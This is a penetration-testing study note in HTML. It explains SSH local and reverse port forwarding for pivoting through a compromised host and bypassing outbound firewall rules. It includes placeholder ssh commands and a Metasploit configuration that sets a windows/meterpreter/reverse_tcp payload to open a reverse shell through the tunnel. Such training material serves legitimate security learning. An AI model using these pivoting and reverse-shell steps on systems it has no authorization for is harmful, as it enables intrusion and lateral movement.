<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Local/Reverse Port Forwarding with ssh</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Local/Reverse Port Forwarding with ssh</h1><br /><strong>
      <h3>Requirements:</h3>
    </strong><br />• SSH server installed on pivot machine<br />• Connectivity to SSH port (22) on the pivot host with
    credentials for user@pivotSystem<br /><strong>
      <h3>CONS:</h3>
    </strong><br />• We can targets only a single port<br /><br /><br />SSH not only allows us to establish a secure
    shell with the target system, but it can be used to tunnel other traffic as well. And it gives us the benefits of
    encryption!<br /><strong>
      <h1>Local Port Forwarding</h1>
    </strong><br />Useful if we have compromised the Pivot machine and found credentials for the SSH-service for access
    to user@&lt;IPpivotSystem&gt;<br /><a
      href="file://C:/CherryTree/screenshots2/PTP-elearnsecurity/2. Network Security/6. Post Exploitation/localPortForwarding.png"><img
        src="images/770-1.png" alt="images/770-1.png" /></a><br /><br />Establish a SSH connection(logging in as
    user@&lt;IPpivotSystem&gt;) with the pivotSystem, and forward all the traffic from the local &lt;AttackerPort&gt; to
    host &lt;TargetIP&gt; on port &lt;TargetPort&gt;, which can be reached from the pivotSystem<br />
    <div class="codebox">
      <div class="codebox">
        ssh&nbsp;-L&nbsp;&lt;AttackerInterfaceIP&gt;:&lt;AttackerPort&gt;:&lt;TargetIP&gt;:&lt;TargetPort&gt;&nbsp;user@<span
          style="color:#000000;font-weight:400">&lt;</span>IPpivotSystem<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br />or if we want that our Attacker machine will listen on all interfaces neglect
    &lt;AttackerInterfaceIP&gt;<br />
    <div class="codebox">
      <div class="codebox">ssh&nbsp;-L&nbsp;:&lt;AttackerPort&gt;:&lt;TargetIP&gt;:&lt;TargetPort&gt;&nbsp;user@<span
          style="color:#000000;font-weight:400">&lt;</span>IPpivotSystem<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> ◇ <strong>Nmap</strong><br /> Using Nmap(from Your Linux machine) with SSH local port forwarding works,
    but SSH imposes limitations. Since SSH directs all traffic to a single port, scans cannot be done to other ports. To
    do that is better make an <a
      href="Home--Penetration_Test_Methodology--Network_Pentest--Post_Exploitation--Pivoting--Tunnelling-Proxying--Dynamic_Port_Forwarding.html">SSH
      Dynamic Port forwarding</a><br /> ◇ <strong>Meterpreter Session</strong><br /> When we have to setup an exploit
    for the <strong>TargetIP</strong>, after that we had setup ssh -L we have to setup metasploit like that:<br />
    <div class="codebox">
      <div class="codebox">
        msf&nbsp;&gt;&nbsp;use&nbsp;&lt;exploit&gt;<br />msf&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp&nbsp;&nbsp;&nbsp;#connection&nbsp;back&nbsp;from&nbsp;our&nbsp;TargetIP<br />msf&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;YOUR_LINUX_IP_ADDRESS<br />msf&nbsp;&gt;&nbsp;set&nbsp;RHOST&nbsp;127.0.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#the&nbsp;SSH&nbsp;port&nbsp;forwarder&nbsp;is&nbsp;listening&nbsp;on&nbsp;all&nbsp;our&nbsp;interfaces<br />msf&nbsp;&gt;&nbsp;set&nbsp;RPORT&nbsp;&lt;AttackerPort&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#the&nbsp;SSH&nbsp;port&nbsp;forwarder&nbsp;is&nbsp;listening&nbsp;on&nbsp;our&nbsp;port&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>AttackerPort<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> The metasploit session connect through our host (127.0.0.1) on TCP port &lt;AttackerPort&gt;. The SSH
    port forwarder is listening on port &lt;AttackerPort&gt; and will forward the traffic through the SSH tunnel to the
    &lt;IPpivotSystem&gt;. Since &lt;IPpivotSystem&gt; can access &lt;TargetIP&gt; on TCP port &lt;TargetPort&gt;, the
    payload delivery will be successful<br /><br /><strong>
      <h1>Reverse(Remote) Port Forwarding</h1>
    </strong><br /><a href=""><img src="images/770-2.png" alt="images/770-2.png" /></a><br /><br /><br />This makes it
    appear to the Target that the service is running on the &lt;pivotSystem&gt; on the &lt;PivotPort&gt;<br />Reverse
    Port Forwarding is similar to the Local Port Forwarding but instead of allowing an attacker to talk to an internal
    host from the outside; it allows an internal host to bypass outbound firewall restrictions to talk outside of the
    network.<br /><br />Establish a SSH connection(logging in as user@pivotSystem) with the pivotSystem, and forward all
    connection attempts to the &lt;PivotPort&gt; to host &lt;AttackerLoopbackIP&gt; on port &lt;AttackerPort&gt;<br />
    <div class="codebox">
      <div class="codebox">
        ssh&nbsp;-o&nbsp;GatewayPorts=yes&nbsp;-R&nbsp;:&lt;PivotPort&gt;:&lt;AttackerLoopbackIP&gt;:&lt;AttackerPort&gt;&nbsp;user@<span
          style="color:#000000;font-weight:400">&lt;</span>IPpivotSystem<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br />If the target vist http://&lt;PivotAddress&gt;:&lt;PivotPort&gt; this request will be handled by our
    attacker machine<br /><span style="color:#a5452a;">example:</span><br />
    <div class="codebox">
      <div class="codebox">ssh&nbsp;-o&nbsp;GatewayPorts=yes&nbsp;-R&nbsp;:8000:127.0.0.1:80&nbsp;user@<span
          style="color:#000000;font-weight:400">&lt;</span>IPpivotSystem<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> -o GatewayPorts=yes → To bind to all interfaces, allows anyone to connect to the
    &lt;pivotPort&gt;<br /><br /><strong>WARNING</strong><br />In <span
      style="text-decoration:underline;">Reverse(Remote) Port Forwarding</span> 127.0.0.1 or localhost refers to the
    machine that initiated the ssh connection(in our case the Attacker machine)<br />In <span
      style="text-decoration:underline;">Local Port Forwarding</span>(in meterpreter) 127.0.0.1 or localhost refers to
    the machine through which the ssh connection pass(in our case the Pivot machine)<br /><br />Bibliography:<br />• <a
      href="https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot" target="_blank">https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot</a><br />•
    <a href="https://zaiste.net/posts/ssh-port-forwarding/" target="_blank">https://zaiste.net/posts/ssh-port-forwarding/</a><br />• <a
      href="https://pen-testing.sans.org/resources/papers/gwapt/tunneling-pivoting-web-application-penetration-testing-120229" target="_blank">https://pen-testing.sans.org/resources/papers/gwapt/tunneling-pivoting-web-application-penetration-testing-120229</a><br />
  </div>
</body>

</html>